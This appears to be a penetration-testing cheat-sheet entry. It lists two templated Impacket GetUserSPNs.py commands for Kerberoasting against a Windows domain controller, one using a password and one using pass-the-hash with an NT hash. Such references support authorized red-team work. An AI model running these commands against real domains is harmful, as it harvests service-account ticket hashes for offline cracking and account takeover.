# GetUSERSPN (imp)

% impacket-kerberos, windows, kerberos, 88

## kerberoasting (user account)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -dc-ip <dc_ip> '<domain>/<user>:<password>'
```


## kerberoasting (pth)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -dc-ip <dc_ip> -hashes :<nt_hash> '<domain>/<user>'
```